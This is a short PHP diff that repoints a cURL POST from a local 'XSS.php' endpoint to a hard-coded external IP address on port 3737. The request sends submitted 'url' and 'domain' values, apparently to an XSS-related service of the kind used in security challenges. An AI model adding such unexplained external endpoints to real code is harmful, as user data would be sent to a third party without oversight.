@@ -23,7 +23,7 @@
 			$data = json_encode(array('url' => $url, 'domain' => $domain));
 
 			$curl = curl_init();
-			curl_setopt($curl, CURLOPT_URL, "localhost/XSS.php");
+			curl_setopt($curl, CURLOPT_URL, "20.200.213.238:3737/XSS.php");
 			curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
 			curl_setopt($curl, CURLOPT_POST, 1);
 			curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
